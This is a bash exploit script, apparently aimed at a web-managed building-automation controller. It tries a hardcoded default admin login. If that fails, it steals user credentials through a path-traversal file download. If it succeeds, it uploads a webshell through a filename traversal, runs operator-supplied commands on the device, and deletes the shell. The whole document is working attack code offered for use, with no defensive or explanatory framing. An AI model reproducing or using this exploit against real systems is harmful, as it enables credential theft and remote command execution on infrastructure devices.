echo "TRYING DEFAULT LOGIN"
deflog=$(curl -i -s -k -X $'POST' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0' -H $'Content-Length: 71' \
    -b $'xwsID=hey' \
    --data-binary $'username=admin&pw=sagichnicht&password=21232f297a57a5a743894a0e4a801fc3' \
    "$1/load.lp?url=static%2Flogin&cmd=login&noCache=1681222291447" | grep "Login successfull")
    
if [ -z "$deflog" ]
then
echo "FUCK, NO DEFAULT CREDS.."
echo "TRYING TO GRAB CREDS"
rm user_pass
hey=$(curl -sk "$1/download.lp?file=C%3a%2fce%2feec%2fhtdocs/cfg/__initUsers.lp" | grep "active=1")
echo "$hey" > resp
echo "--------User:Pass--------"
cat resp | while read line
do
users=$(echo "$line" | grep -oP '(?<=login=").*?(?=",)')
pass=$(echo "$line" | grep -oP '(?<=password=").*?(?=",)')
echo $users ":" $pass
echo $users ":" $pass >> user_pass
done
echo "------------------------"
rm resp

else
echo  "Default Creds OK, let's upload payload a webshell"
curl -sk -F "path=C:/ce/eec/data/uploads" -F "filename=@z.lp; filename=../../htdocs/z.lp"  -H "Cookie: xwsID=hey;lastLogin=admin; tabSet_serviceReset=0; tabSet_serviceDatabase=0; tabSet_serviceReboot=0; tabSet_serviceFirmware=0; tabSet_cfgGeneral=0; tabSet_cfgTcpip=0; tabSet_cfgLon=0; tabSet_cfgMb=0; tabSet_cfgTime=0; tabSet_cfgPortal=0; tabSet_undefined=0; tabSet_editAlarm_2=0; tabSet_getNewNode=0; tabSet_getMaintainance=0; tabSetNodelist=4; tabSet_dataExp5=0; tabSet_dataView5=0" "$1/request.lp?url=static%2Frequests%2Fupload&cmd=&source=doc"
echo -n "$~> "
read cmds
curl -sk -X POST $1/z.lp -d "cmd=$cmds"
echo "DELETING WEBSHELL"
curl -sk -H "Cookie: xwsID=hey;lastLogin=admin; tabSet_serviceReset=0; tabSet_serviceDatabase=0; tabSet_serviceReboot=0; tabSet_serviceFirmware=0; tabSet_cfgGeneral=0; tabSet_cfgTcpip=0; tabSet_cfgLon=0; tabSet_cfgMb=0; tabSet_cfgTime=0; tabSet_cfgPortal=0; tabSet_undefined=0; tabSet_editAlarm_2=0; tabSet_getNewNode=0; tabSet_getMaintainance=0; tabSetNodelist=4; tabSet_dataExp5=0; tabSet_dataView5=0" "$1/request.lp?url=modules%2Fsite%2Frequests%2FmodifyDoc&cmd=deleteDocuments&noCache=1681207058284" -d 'files=%5B%22C%3A%2Fce%2Feec%2Fhtdocs%2fz.lp"]'
fi
